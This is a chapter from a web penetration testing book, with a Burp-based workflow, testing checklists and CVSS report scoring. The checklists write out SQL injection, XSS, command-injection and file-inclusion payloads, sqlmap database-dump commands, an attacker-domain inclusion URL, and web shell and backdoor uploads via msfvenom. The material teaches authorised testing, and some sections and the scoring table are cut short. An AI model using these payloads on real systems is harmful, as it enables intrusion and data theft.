<p class="mce-root"><span>The purpose of this whole book was mainly to get to this topic: the</span> <strong>Web Intrusion Test,</strong> <span>also known as the <strong>Web Penetration Test</strong>. You probably bought the book because of this topic, but you need to know that web penetration testing is only one piece of the puzzle. In order to achieve a successful, full penetration test, you need to include Threat Modeling, Source Code Review, and network pentests, as well.</span></p>
<p class="mce-root"><span>The <a href="78c64b12-3d5c-4547-bf16-ab035fcd39c0.xhtml" target="_blank">Chapter 7</a>, <em>Application Threat Modeling</em>, should have given you an architectural overview of web applications, and the Source Code Review should've given you a deep understanding too. Don't forget network pentests, which can reveal interesting vulnerabilities. I've created this sequence of chapters for a reason—to reflect real-life scenarios. I'm not writing this book for money; in fact, I want my readers to wonder, <em>who is the author of this book? Let me buy him a beer!</em></span></p>
<p class="mce-root"><span>As I have done previously, I will do my best to write this chapter with minimum philosophy and maximum straight-to-the-point contents. For that reason, let's skip all the talking and start this amazing chapter, which will cover the following topics:</span></p>
<ul>
<li class="mce-root">Web Intrusion Test workflow</li>
<li>Identifying hidden web contents</li>
<li>Common web page testing checklist</li>
<li>Special page testing checklist</li>
<li>Reporting</li>
</ul>

<p><span>This is the most important section of this chapter, because it will allow you to structure your tests. A challenge that a typical pen tester will face is everyone telling them to refer to the OWASP checklist for web intrusion tests. But, the big questions that all testers will ask themselves are, <em>where do I start? </em><em>How do I proceed with the checklist?</em> Before I get into the steps, let's take a look at an image of this workflow, a picture worth a thousand words. My workflow is based on a proxy-based tool: Burp Pro. Please refer to <a href="af3c338d-d137-4283-85d7-08e4ecc88ac5.xhtml" target="_blank">Chapter 4</a>, <em>All About Using Burp Suite</em> at the beginning of this book for more details:</span></p>

<ol>
<li><span>The first step is not mentioned in the preceding diagram; it's the web server vulnerability assessment, which we discussed in the previous chapter.</span></li>
<li><span>The second step is to fire Burp and make sure that the intercept is on in the <span class="packt_screen">Proxy</span> tab. Next, start browsing each page separately, and check the contents through the proxy <span class="packt_screen">Request/Response</span> details. While you're browsing, try to interact with each page, manually sending form post requests with data. Also, try to use the search button on the search page. You get the idea; don't just click around blindly.</span></li>
<li><span>Crawl the pages using <strong>Burp Spider</strong> and <strong>Burp Content Discovery</strong>. You can use other tools for crawling, as well; check the previous chapter, in the HTTP enumeration section.</span></li>
</ol>
<ol start="4">
<li><span>Identify any hidden contents, such as the <kbd>robots.txt</kbd> file. We will show the checklist later in this chapter (for the time being, work on getting the big picture).</span></li>
<li><span>Burp will list all of the pages and files found in the <span class="packt_screen">Target</span> tab. For each page found, perform the steps that follow.</span></li>
<li><span>Send each request to the <strong>Burp Scanner</strong> to scan for issues automatically.</span></li>
<li><span>For manual scanning, you will need to ask the following question: <em>is it a special page?</em> (For example, a login page; again, don't worry. I will list all of the details later.)</span></li>
<li><span>If it's a special page, we will go through the checklist specific to that page. For example, if it's a login page, we will test the default credentials. After that, we will go through the common checklist.</span></li>
<li><span>If it's not a special page, we will go straight to the common checklist (checking comments, input testing for SQLi, and so on).</span></li>
<li><span>Gather all of the vulnerabilities found and create a report from them.</span></li>

<p>Practically speaking, the big question that you will ask yourself is, <em>what do I need to find?</em> You will need a solid checklist to refer to when it's time for your web intrusion test. That being said, here's a checklist that you can use for this step in the workflow:</p>
<ol>
<li><kbd>Robots.txt</kbd> file</li>
<li>Backup files (<kbd>.bak</kbd>, <kbd>.old</kbd>)</li>
<li>Other interesting files (<kbd>.xls</kbd>, <kbd>.doc</kbd>, <kbd>.pdf</kbd>, <kbd>.txt</kbd>)</li>
<li>Administration URL (for example, <kbd>phpmyadmin, wp-admin</kbd>)</li>
<li>Debugging leftover pages and URLs</li>
<li>Is CMS used? (WordPress)</li>
</ol>
<p>If you find any item in the preceding list, check its contents for juicy information, including:</p>
<ul>
<li>Personal information</li>
<li>Email addresses</li>
<li>Credentials</li>
<li>An entry point to another system (for example, WordPress)</li>
</ul>

                    <h1 class="header-title">Common web page checklist</h1>
                </header>
            
            <article>
                
<p>This is at the heart of the checklist for web intrusion testing. As mentioned in the preceding workflow, you will need to apply this checklist to every page, regardless of its nature. Let's dive in:</p>
<ol>
<li>Identify the <strong>entry points</strong> to the web page (which lead to the backend; remember that we will use the entry points in the next steps), including:
<ul>
<li>URLs</li>
<li>Headers (for example, cookie, URL referrer, and so on)</li>
<li>HTML controls (drop-down list, radio button, hidden input, textbox, and so on)</li>
</ul>
</li>
<li>Check all of the backend or third-party web services and web APIs called using Burp Target.</li>
<li><strong>Force</strong> the URL into <strong>HTTP</strong> mode, and see if it works, or if it stays in HTTPS.</li>
<li>Try to make the page <strong>generate an error</strong>; in another words, do error messages reveal clues to hackers?</li>
<li>Test for <strong>logic flaws</strong> (for example, purchasing an item with zero dollars, or applying a randomly generated discount).</li>
<li>Can we load the page <strong>without authentication</strong>? Use <span class="packt_screen">Request in browser</span><span> in Burp</span> (unless it's not meant to be protected).</li>
<li>Try to <strong>call an admin page or resource</strong> (for example, web APIs and images) directly, with a low-level privilege.</li>
<li>Test with <strong>multiple accounts that have different privileges</strong> (normal users versus admins). Use Burp's compare site maps feature to accomplish this task.</li>
<li>Check the <strong>header security best practices,</strong> making sure that the following values exist:
<ul>
<li><kbd>X-frame-options</kbd></li>
<li><kbd>X-content-type-options</kbd></li>
<li><kbd>Strict-transport-security</kbd></li>
<li><kbd>Content-security-policy</kbd></li>
<li><kbd>X-permitted-cross-domain-policies</kbd></li>
<li><kbd>X-XSS-protection:1;mode=block</kbd></li>
<li><kbd>X-content-type-options:nosniff</kbd></li>
</ul>
</li>
<li>Analyze the <strong>cookie/sessionID</strong> for <strong>randomness</strong> by sending it to the Burp Sequencer.</li>
</ol>
<ol start="11">
<li><strong>Brute-force</strong> the <strong>cookie/sessionID</strong> by sending it to Burp Intruder. Choose <span class="packt_screen">sniper</span> as an attack type, and for the payload type, set it to <span class="packt_screen">Character Frobber</span>.</li>
<li>Make sure that <strong>a new session</strong> will be generated after each login.</li>
<li>Try to <strong>decode the cookie/sessionID</strong> (or ASP.NET ViewState) using Burp Decoder.</li>
<li><strong>Manipulate the cookie parameters</strong> (for example, change <kbd>isAdmin=0</kbd> to <kbd>isAdmin=1</kbd>).</li>
<li>What is the <strong>duration of the session timeout</strong>?</li>
<li>Check the <strong>client source code</strong> (HTML and JavaScript), looking for:
<ul>
<li>HTML comments</li>
<li>Debugging leftovers</li>
<li>Security logic flaws</li>
<li>The contents of the hidden input controls</li>
<li>Disabled controls (for example, <kbd>&lt;input disabled="true" name="secret"&gt;</kbd>)</li>
</ul>
</li>
<li>Check whether the <strong>logout button exists</strong> on all of the authenticated pages.</li>
<li><strong>Search for an ID</strong> (for example, <kbd>EmployeeID= 100</kbd>) in the entry points, and brute-force it using Burp Intruder. Generally, this test will allow you to reveal other users' data (two accounts with the same privileges, for example).</li>
<li>Try to <strong>access resources</strong> that the testing account is not allowed to see (for example, pictures, documents, and so on).</li>
<li>Test for <strong>CSRF</strong> using Burp CSRF POC. Generally, the Burp scanner will detect it automatically.</li>
<li>Try to <strong>bypass each HTML control that has client-side validation</strong> (for example, <kbd>&lt;form action='addItem.aspx' onsubmit='return validate(this)' &gt;</kbd>); check to see whether the server side will validate it, as well.</li>
<li>Test for <strong>SQL Injection</strong> by using fuzzing techniques (use Burp Intruder or Repeater), and inject the following:
<ul>
<li><kbd>'</kbd></li>
<li>1; wait for delay <kbd>'0:15:0'--</kbd></li>
<li>Use SQL map to automate it: </li>
</ul>
</li>
</ol>
<pre style="padding-left: 120px"><strong>$sqlmap -u <span>http</span><span>://[victim IP] --crawl=1</span></strong></pre>
<ol start="23">
<li>If you received an error message, or if the delay was executed, use <strong>SQL map to dump the database</strong> (for the following example, we already identified that <kbd>http://10.0.0.100/index.php?id=234</kbd> is a candidate, and that the database is MySQL):</li>
</ol>
<pre style="padding-left: 60px"><strong>$</strong><span><strong>sqlmap</strong> <strong>-u </strong></span><strong><span>http://10.0.0.100/index.php?id=234 </span><span>--dbms=mysql --dump --</span><span>threads=7</span><span> </span></strong></pre>
<ol start="24">
<li>Test for <strong>XSS</strong> by using fuzzing techniques <span>(use Burp Intruder or Repeater), and try to inject the following:</span>
<ul>
<li><kbd>&lt;script&gt; alert(1) &lt;/script&gt;</kbd></li>
<li><kbd>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</kbd></li>
</ul>
</li>
<li><span>Test for <strong>Command Injection</strong> by using fuzzing techniques </span><span>(use Burp Intruder or Repeater), and try to inject the following (I will use the <kbd>whoami</kbd> command, since it exists on both Windows and Linux):</span>
<ul>
<li><kbd>&amp; whoami</kbd></li>
<li><kbd>| whoami</kbd></li>
<li><kbd>|| whoami</kbd></li>
<li><kbd>; whoami</kbd></li>
</ul>
</li>
<li>Test for Local File Inclusion by using fuzzing techniques (use Burp Intruder or Repeater), and try to inject the following (try to manually change the number of slashes to get to the correct directory):
<ul>
<li><kbd>Linux: ../../../../etc/passwd</kbd></li>
<li><kbd>Windows: ../../../../boot.ini</kbd></li>
</ul>
</li>
<li>Test for <strong>Remote File Inclusion</strong> by injecting the URL of another website (for example, <kbd>http://[victim domain]/page.php?file=http://[attacker domain]/[infected page]</kbd>).</li>

<p><span>You will encounter some specific pages during pen tests, and when you do, you'll have to use a checklist different from the one we used before. Take note that you will still need to use the common checklist too, after finishing this step:</span></p>
<ol>
<li><span><strong>Login page</strong> (this includes the admin page):</span>
<ol>
<li><span>Test for default credentials (for example, <kbd>username= admin</kbd> and <kbd>password= admin</kbd>).</span></li>
<li><span>Brute-force credentials using a dictionary file.</span></li>
<li><span>Test for a lockout after a number of failed attempts for accomplishing a DOS instead.</span></li>
<li><span>Does it use CAPTCHA? It allows for defending against automated attacks.</span></li>
<li><span>Use SQL injection to bypass authentication.</span></li>
<li><span>Do they use</span> <span class="packt_screen"><span>remember</span> me</span> passwords?</li>
</ol>
</li>
<li><strong><span>Registration page</span></strong>:
<ol>
<li><span>Do they allow weak passwords?</span></li>
<li><span>If you register with an existing username, will you be able to enumerate users?</span></li>
<li><span>Test for weak, pre-generated questions and answers (for example, favorite color, which can easily be brute-forced).</span></li>
</ol>
</li>
<li><strong><span>Reset/change password page</span></strong>:
<ol>
<li><span>Test whether a user can change someone else's password (for example, change the admin password).</span></li>
<li><span>Check the workflow of password changing and resetting.</span></li>
<li><span>Does the user</span> receive <span>a confirmation email after the change/reset?</span></li>
<li><span> What information is required to reset/change a password?</span></li>
<li><span> How strong (or random) are the new, temporary passwords (for password resets)?</span></li>
<li><span>Is the user forced to change the random password after his or her first login (for password resets)?</span></li>
<li><span>For password changes, is the user required to enter his or her old password during the changing process?</span>            </li>
</ol>
</li>
</ol>
<ol start="4">
<li><strong><span>Upload page</span></strong>:
<ol>
<li><span>Can you upload a web shell? (Use <kbd>msfvenom</kbd>.)</span></li>
<li><span>If the application allows for executables to be uploaded, will you be able to upload a backdoor? (Use <kbd>msfvenom</kbd>.)</span></li>
<li><span>After uploading, can you access the files through a URL? Can you see others users' files?</span></li>

<p class="mce-root"><span>After finishing your penetration testing activities, you will need to create a report. People tend to copy and paste from the tools' (Burp, Nessus, and so on) auto generated reports. This is what differentiates an amateur from a professional: the latter will make sure to verify the false positives and re-evaluate the scoring of a vulnerability. In this section, I will show you how to evaluate the scoring of your findings, and after that, I will share a template that you can use to get ideas for your future reporting activities.</span></p>

                    <h1 class="header-title">Common Vulnerability Scoring System – CVSS</h1>
                </header>
            
            <article>
                
<p class="mce-root"><span>The <strong>Common Vulnerability Scoring System</strong></span> (<span><strong>CVSS</strong></span>) <span>v3 came out a while ago, as an enhancement for CVSS v2. The big question is: why do you need to calculate it, if it's already done by the tool (for example, Burp)? Let me give you an example. Suppose that you have found an SQL Injection vulnerability, and the report tells you that the score is high. In reality, the server that was tested was disconnected from the internet and available on a specific VLAN, and on top of that, the data stored in the database was not confidential. Should you still consider the score to be high? Of course not! That's why you always need to recalculate your score, to make sure that it matches the reality.</span></p>
<div class="mce-root packt_infobox"><span>Here, I'm using CVSS v3, but you can use the online calculator at</span> <a href="https://www.first.org/cvss/calculator/3.0"><span>https://www.first.org/cvss/calculator/3.0</span></a><span>.</span></div>
<p class="mce-root"><span>The CVSS takes the following variables into consideration (you will understand the meaning of each one of them later):</span></p>
<ul>
<li class="mce-root"><span><strong>Attack Vector (AV)</strong>: Network (N), Adjacent (A), Local (L), Physical (P)</span></li>
<li class="mce-root"><span><strong>Attack Complexity (AC)</strong>: Low (L), High (H)</span></li>
<li class="mce-root"><span><strong>Privileges Required (PR)</strong>: None (N), Low (L), High (H)</span></li>
<li class="mce-root"><span><strong>User Interaction (UI)</strong></span>: <span>None (N), Required (R)</span></li>
<li class="mce-root"><span><strong>Scope (S)</strong></span>: <span>Unchanged (U), Changed (C)</span></li>
<li class="mce-root"><span><strong>Confidentiality (C)</strong></span>: <span>None (N), Low (L), High (H)</span></li>
<li class="mce-root"><span><strong>Integrity (I)</strong></span>: <span>None (N), Low (L), High (H)</span></li>
<li class="mce-root"><span><strong>Availability (A)</strong></span>: <span>None (N), Low (L), High (H)</span></li>
</ul>
<div class="mce-root packt_infobox"><span>Some people prefer to use the DREAD methodology to calculate the score. It's a personal choice; in the end, you need to make sure that you have an accurate measure that helps your organization (or client). Also, you can use both at the same time, it's an overhead; but again, there is no preference. Discuss it with the team to find out what their favorite method is. In the end, you need to take it into consideration that most of the tools use the <strong>National Vulnerability Database</strong> (<strong>NVD</strong>), and this uses CVSS to calculate the score.</span></div>
<p class="mce-root"><span>How can we say that a score of 9 is high, or critical? You don't need to bump your head against the wall; here's the score guidance:<br/></span><span><strong>CVSS V3 Base Score</strong>: 0-10</span></p>
<table style="border-collapse: collapse;width: 100%" border="1">
<tbody>
<tr>
<td><strong>Severity</strong></td>
<td><strong>Base Score Range</strong></td>
</tr>
<tr>
<td>None</td>
<td>0</td>
</tr>
<tr>
<td>Low</td>
<td>0.1 - 3.9</td>
</tr>
<tr>
<td>Medium</td>
</tr>
<tr>
<td>High</td>
<td>7.0 - 8.9</td>
</tr>
<tr>
<td>Critical</td>
<td>9.0 - 10.0</td>
</tr>
</tbody>
</table>
<p> </p>
<p class="mce-root"><span>Let's look at a practical example to calculate the CVSS scores of two vulnerabilities:</span></p>
<ul>
<li class="mce-root"><span>SQL Injection</span></li>

<p class="mce-root"><span>I hope that you liked this chapter. Most importantly, I hope that it will help you get your pen test tasks done quickly and efficiently. The workflow that I shared with you in this chapter is the secret sauce for your success; I use it during my own pen tests. I did my best to give you a checklist without nitty-gritty details, because you should've learned those at the beginning of this book (especially in <a href="3ebde1b5-8f24-4c13-984c-c5a3bdf83b58.xhtml" target="_blank">Chapter 5</a>, <em>Understanding Web Application Vulnerabilities</em>). I structured the book this way for a reason.</span></p>
<p class="mce-root"><span>At this point, you've seen all of the activities for penetration testing, from Threat Modeling to Web Intrusion Testing. What's next? Now that you've seen it all, the next step is to learn how to automate penetration testing tasks by using the amazing programming language that is Python.</span></p>
